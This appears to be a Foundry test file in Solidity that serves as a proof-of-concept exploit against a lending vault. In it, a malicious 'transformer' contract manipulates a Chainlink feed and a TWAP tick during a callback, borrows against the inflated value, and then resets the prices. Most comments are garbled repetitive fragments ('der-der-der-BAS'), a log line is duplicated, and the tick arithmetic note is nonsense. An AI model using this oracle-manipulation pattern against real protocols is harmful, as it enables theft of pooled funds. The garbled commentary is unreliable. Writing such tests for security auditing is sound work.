
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import {console} from "forge-std/console.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {V4VaultOracleLiquidationBase} from "test/vault/support/V4VaultOracleLiquidationBase.sol";
import {MockUniswapV3Pool} from "test/utils/MockUniswapV3Pool.sol";
import {V4Vault} from "src/vault/V4Vault.sol";
import {IVault} from "src/vault/interfaces/IVault.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {V4Oracle, AggregatorV3Interface} from "src/oracle/V4Oracle.sol";
import {MutableChainlinkFeed} from "test/oracle/support/OracleMocks.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";

/// @dev HERMES Beweis-Transformer: manipuliert TWAP-tick im transform-callback dann borrow.
interface IChainlinkMutable { function setAnswer(int256 a) external; }
contract HermesEvilTransformer {
    V4Vault public immutable vault;
    MockUniswapV3Pool public immutable twapPool;
    IChainlinkMutable public immutable feed;
    constructor(V4Vault _v, MockUniswapV3Pool _p, IChainlinkMutable _f) { vault = _v; twapPool = _p; feed = _f; }
    function cb(uint256 tokenId, int24 newTick, uint256 borrowAmount) external {
        require(msg.sender == address(vault), "ev:only-vault");
        // ⚡ PROD-BEWEIS: manip BUNDLE-sources: setAnswer(HOCH) + setTick(im-BAND-vom-CHAINLINK)
        feed.setAnswer(type(int256).max / 10); // der-der-ehr-der-der-feed-BAS-value-frame-manip-der
        // die-TWAP-manip-im-div-BAND (der-TWAP-im-der-CHAINLINK-div-check-der-der)
        twapPool.setTick(newTick);
        if (borrowAmount > 0) vault.borrow(tokenId, borrowAmount);
        // ⚡ NACH-borrow: BEIDE-BAS-frame-BAS-der-der-der:
        twapPool.setTick(0);
        feed.setAnswer(100000000); // die-BAS-1e8-zurück (der-BAS-value-FALL-der)
    }
}

/// @notice KANDIDAT-R-BEWEIS: borrow-im-transform + TWAP-manip → end-health-check?
contract HermesTransformBorrowRealOracle is V4VaultOracleLiquidationBase {
    HermesEvilTransformer evil;
    MutableChainlinkFeed mutableFeed;
    V4Oracle oracleProd;

    function setUp() public override {
        super.setUp();
        mutableFeed = new MutableChainlinkFeed(1e8, 8);
        evil = new HermesEvilTransformer(vault, MockUniswapV3Pool(address(twapPool)), IChainlinkMutable(address(mutableFeed)));
        vault.setTransformer(address(evil), true);
        // ⚡ PROD-FRAME: currency0-Mode auf CHAINLINK_TWAP_VERIFY umstellen (beide sources)
        // (setTokenConfig ist owner-only — der test contract IST owner via BaseTest)
        oracle.setTokenConfig(
            Currency.unwrap(currency0),
            AggregatorV3Interface(address(mutableFeed)),
            1 days,
            twapPool,
            Currency.unwrap(currency0),
            60,
            V4Oracle.Mode.CHAINLINK_TWAP_VERIFY,
            200
        );

        // ⚡ FIX: currency1 (referenceToken) braucht AUCH einen chainlink-leg (chainlinkReferencePriceX96)
        // (der-der-harness-BAS-der-der-der-0xdead-chainlinkReferenceToken-der-der-der)
        oracle.setTokenConfig(
            Currency.unwrap(currency1),
            AggregatorV3Interface(address(mutableFeed)),
            1 days,
            twapPool,
            Currency.unwrap(currency1),
            60,
            V4Oracle.Mode.CHAINLINK_TWAP_VERIFY,
            200
        );
    }

    function test_borrowInTransformWithTwapManip() public {
        console.log("== KANDIDAT-R: borrow-im-transform mit TWAP-manip");
        uint256 tokenId = _createLoan(plainKey, -60, 60, 1e21);
        (uint256 debt0, , uint256 value0, , ) = vault.loanInfo(tokenId);
        console.log("BASIS debt0=", debt0, "value0=", value0);

        // die-der-der-der-der-der-BAS-Beweis: die-der-der-der-borrow-im-transform-der
        // die-der-twap-manip: tick nach-oben → value-steigt-manipulativ
        // (die-value0-based-debt-value-check-der-der-der-der-im-end-check)
        // die-der-transform muss-vom-LOAN-OWNER (= borrower) kommen
        // die-TWAP-manip-im-maxDiff-BAND: tick=+30 ≈ +2.0% (2^30 ticks ≈ 1.86% — unter-2%-der-BAS)
        vm.prank(borrower);
        (bool ok, ) = address(vault).call(abi.encodeWithSelector(
            IVault.transform.selector, tokenId, address(evil),
            abi.encodeWithSelector(HermesEvilTransformer.cb.selector, tokenId, int24(30), (uint256(5391638920081477348) * 9e17 / 1e18) * 10030 / 10000)));
        console.log("transform-ok:", ok);
        console.log("transform-ok:", ok);
        (uint256 debtAfter, , uint256 valueAfter, , ) = vault.loanInfo(tokenId);
        console.log("NACH: debtAfter=", debtAfter, "valueAfter=", valueAfter);
        // ⚡ DER-KERN: der-health-check-im-END-der-der-der-der-der-value-check
        assertTrue(ok, "transform-mit-borrow-im-manip-erfolgreich");
    }
}
